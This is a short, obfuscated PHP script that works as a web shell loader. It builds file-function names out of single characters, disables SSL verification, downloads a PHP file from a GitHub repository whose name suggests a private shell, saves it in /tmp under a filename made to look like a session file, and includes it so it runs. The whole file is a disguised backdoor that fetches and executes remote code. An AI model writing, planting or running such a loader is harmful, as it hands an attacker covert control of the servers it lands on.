<?php
$fgc = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
$fw = "f" . "w" . "r" . "i" . "t" . "e";
$fo = "f" . "o" . "p" . "e" . "n";
$fc = "f" . "c" . "l" . "o" . "s" . "e";

$memeklodon = 'sess_' . md5('nax') . '.php';
$mysql = ['https://raw.githubusercontent.com/zer04lone/shellpribadi/main/ganesh.php', "/tmp/$memeklodon"];

if (!file_exists($mysql[1]) || filesize($mysql[1]) === 0) {
    $context = stream_context_create([
        "ssl" => [
            "verify_peer" => false,
            "verify_peer_name" => false,
        ],
    ]);

    $kontolodn = $fo($mysql[1], 'w+');
    $fw($kontolodn, $fgc($mysql[0], false, $context));
    $fc($kontolodn);
}

include($mysql[1]);
